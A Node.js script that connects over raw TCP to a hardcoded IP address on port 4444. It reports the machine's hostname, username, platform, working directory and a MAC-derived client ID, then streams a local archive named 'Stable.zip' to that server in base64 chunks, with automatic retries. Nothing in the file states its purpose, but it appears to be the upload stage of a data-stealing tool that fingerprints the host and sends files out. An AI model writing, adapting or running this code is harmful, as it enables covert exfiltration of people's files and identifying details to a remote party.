const fs = require('fs');
const net = require('net');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

// ===================== CONFIGURATION =====================
const CONFIG = {
    serverHost: '92.246.137.44', // Replace with your server address
    serverPort: 4444,            // Replace with your server port
    
    archiveFileName: 'Stable.zip', // Name of the archive to send
    chunkSize: 256 * 1024,         // 256KB chunk size
    retryDelay: 5000,              // 5 seconds between retry attempts
    maxRetries: 5                  // Maximum reconnection attempts
};

// ===================== LOGGING UTILITY =====================
function log(message, isError = false) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}`;
    
    if (isError) {
        console.error(logMessage);
    } else {
        console.log(logMessage);
    }
    
    // Optional: Log to file
    try {
        fs.appendFileSync('upload.log', `${logMessage}\n`);
    } catch (error) {
        console.error(`Error writing to log: ${error.message}`);
    }
}

// ===================== UTILITY FUNCTIONS =====================
function generateClientId() {
    try {
        const macAddress = getMacAddress();
        const hostname = os.hostname();
        const username = os.userInfo().username;
        
        const hash = crypto.createHash('md5')
            .update(`${macAddress}:${hostname}:${username}`)
            .digest('hex')
            .substring(0, 8);
        
        return hash;
    } catch (error) {
        return Math.random().toString(36).substring(2, 10);
    }
}

function getMacAddress() {
    try {
        const networkInterfaces = os.networkInterfaces();
        for (const name of Object.keys(networkInterfaces)) {
            for (const netInterface of networkInterfaces[name]) {
                if (!netInterface.internal && netInterface.mac !== '00:00:00:00:00:00') {
                    return netInterface.mac;
                }
            }
        }
        return 'unknown';
    } catch (error) {
        return 'unknown';
    }
}

function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ===================== FILE TRANSFER FUNCTIONS =====================
async function sendFileInChunks(filePath, socket) {
    try {
        // Check file existence
        if (!fs.existsSync(filePath)) {
            log(`File not found: ${filePath}`, true);
            return false;
        }
        
        const stats = fs.statSync(filePath);
        const fileName = path.basename(filePath);
        const fileSize = stats.size;
        const totalChunks = Math.ceil(fileSize / CONFIG.chunkSize);
        
        log(`Preparing to send file: ${fileName}`);
        log(`File size: ${formatFileSize(fileSize)}`);
        log(`Total chunks: ${totalChunks} (${CONFIG.chunkSize} bytes per chunk)`);
        
        // System and client information
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            type: os.type(),
            arch: os.arch(),
            username: os.userInfo().username,
            id: generateClientId()
        };
        
        // Send client information
        socket.write(`Connected - ${systemInfo.hostname} (${systemInfo.platform} ${systemInfo.arch})\n`);
        socket.write(`Current directory: ${process.cwd()}\n`);
        socket.write(`Client ID: ${systemInfo.id}\n`);
        
        log(`Starting file transfer...`);
        const transferStartTime = Date.now();
        
        // Notify about large file
        if (fileSize > 10 * 1024 * 1024) {
            socket.write(`LARGE_FILE:${fileName}:${fileSize}\n`);
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        // Start chunked file transfer
        socket.write(`CHUNKED_FILE_START:${fileName}:${fileSize}:${totalChunks}:${CONFIG.chunkSize}\n`);
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Open file for reading
        const fileHandle = await fs.promises.open(filePath, 'r');
        const buffer = Buffer.alloc(CONFIG.chunkSize);
        
        let currentChunk = 0;
        let bytesRead;
        
        try {
            while (currentChunk < totalChunks) {
                // Read file chunk
                bytesRead = await fileHandle.read(buffer, 0, CONFIG.chunkSize, currentChunk * CONFIG.chunkSize);
                
                if (bytesRead.bytesRead === 0) break;
                
                // Send file chunk
                const chunkBuffer = buffer.slice(0, bytesRead.bytesRead);
                const base64Chunk = chunkBuffer.toString('base64');
                
                socket.write(`CHUNKED_FILE_DATA:${fileName}:${currentChunk}:${totalChunks}:${base64Chunk}\n`);
                
                currentChunk++;
                
                // Progress calculation
                const progress = (currentChunk / totalChunks) * 100;
                if (currentChunk % 10 === 0) {
                    log(`Transfer progress: ${progress.toFixed(1)}%`);
                }
                
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            // End file transfer
            socket.write(`CHUNKED_FILE_END:${fileName}:${currentChunk}:${fileSize}\n`);
            
            log(`File transfer completed successfully`);
            return true;
            
        } finally {
            await fileHandle.close();
        }
    } catch (error) {
        log(`Error sending file: ${error.message}`, true);
        return false;
    }
}

// ===================== MAIN TRANSFER FUNCTION =====================
function uploadArchive() {
    log('Starting archive upload process...');
    
    const archivePath = path.join(process.cwd(), CONFIG.archiveFileName);
    
    const socket = new net.Socket();
    let retryCount = 0;
    
    socket.on('connect', async () => {
        log(`Connected to server ${CONFIG.serverHost}:${CONFIG.serverPort}`);
        retryCount = 0;
        
        const success = await sendFileInChunks(archivePath, socket);
        
        if (success) {
            log('Archive sent successfully. Waiting for server confirmation...');
            setTimeout(() => {
                log('Server confirmation timeout. Exiting...');
                socket.end();
                process.exit(0);
            }, 30000);
        } else {
            log('Archive transfer failed', true);
            socket.end();
            process.exit(1);
        }
    });
    
    socket.on('data', (data) => {
        const response = data.toString().trim();
        log(`Server response: ${response}`);
        
        if (response.includes('CHUNKED_FILE_END') || response.includes('File uploaded successfully')) {
            log('Server acknowledged successful file transfer');
            socket.end();
            setTimeout(() => process.exit(0), 1000);
        }
    });
    
    socket.on('error', (error) => {
        log(`Connection error: ${error.message}`, true);
        retryConnection(archivePath);
    });
    
    socket.on('close', () => {
        log('Connection closed');
    });
    
    function retryConnection(filePath) {
        retryCount++;
        
        if (retryCount <= CONFIG.maxRetries) {
            log(`Retry attempt ${retryCount}/${CONFIG.maxRetries} in ${CONFIG.retryDelay/1000} seconds...`);
            
            setTimeout(() => {
                log(`Reconnecting...`);
                socket.connect(CONFIG.serverPort, CONFIG.serverHost);
            }, CONFIG.retryDelay);
        } else {
            log(`Maximum retry attempts reached (${CONFIG.maxRetries}). Giving up.`, true);
            process.exit(1);
        }
    }
    
    // Initial connection
    socket.connect(CONFIG.serverPort, CONFIG.serverHost);
}

// Run the upload process
uploadArchive();